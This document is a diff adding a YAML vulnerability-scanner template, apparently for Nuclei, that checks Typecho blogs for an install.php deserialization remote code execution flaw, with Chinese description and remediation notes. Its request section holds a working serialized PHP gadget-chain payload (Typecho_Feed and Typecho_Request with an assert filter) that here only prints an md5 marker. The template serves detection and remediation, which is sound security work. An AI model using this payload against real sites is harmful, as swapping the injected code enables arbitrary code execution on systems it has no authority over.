@@ -1,0 +1,40 @@
+id: Typecho-Rce
+info:
+  name: Typecho Remote Code Execution
+  author:
+  - l0ne1y
+  tags:
+  - typecho
+  description: |-
+    Typecho install.php 反序列化漏洞
+    typecho 是一款非常简洁快速博客 CMS，前台 install.php 文件存在反序列化漏洞，通过构造的反序列化字符串注入可以执行任意 PHP 代码。
+  reference:
+  - https://www.freebuf.com/vuls/155753.html
+  - https://www.freebuf.com/vuls/152058.html
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1、升级系统至无漏洞版本，或于官网下载安全补丁
+
+    临时修复方案：
+    1、不要把用户的输入或者是用户可控的参数直接放进反序列化的操作中去。
+    2、在进入反序列化函数之前,对参数进行限制过滤。
+    3、给反序列数据加密签名，并确保解密在反序列之前
+    4、给反序列化接口添加认证授权
+requests:
+- matchers:
+  - type: word
+    words:
+    - '{{md5(verify)}}'
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/install.php?finish'
+  method: POST
+  body: __typecho_config={{payload}}
+  headers:
+    Referer: '{{BaseURL}}'
+variables:
+  payload: '{{base64(url_decode("a%3A2%3A%7Bs%3A7%3A%22adapter%22%3BO%3A12%3A%22Typecho_Feed%22%3A2%3A%7Bs%3A19%3A%22%00Typecho_Feed%00_type%22%3Bs%3A8%3A%22ATOM+1.0%22%3Bs%3A20%3A%22%00Typecho_Feed%00_items%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bs%3A8%3A%22category%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A15%3A%22Typecho_Request%22%3A2%3A%7Bs%3A24%3A%22%00Typecho_Request%00_params%22%3Ba%3A1%3A%7Bs%3A10%3A%22screenName%22%3Bs%3A18%3A%22print%28md5%28%27"
+    + verify + "%27%29%29%22%3B%7Ds%3A24%3A%22%00Typecho_Request%00_filter%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22assert%22%3B%7D%7D%7Ds%3A6%3A%22author%22%3BO%3A15%3A%22Typecho_Request%22%3A2%3A%7Bs%3A24%3A%22%00Typecho_Request%00_params%22%3Ba%3A1%3A%7Bs%3A10%3A%22screenName%22%3Bs%3A18%3A%22print%28md5%28%27"
+    + verify + "%27%29%29%22%3B%7Ds%3A24%3A%22%00Typecho_Request%00_filter%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22assert%22%3B%7D%7D%7D%7D%7Ds%3A6%3A%22prefix%22%3Bs%3A8%3A%22typecho_%22%3B%7D"))}}'
+  verify: '{{rand_text_alphanumeric(8,"")}}'
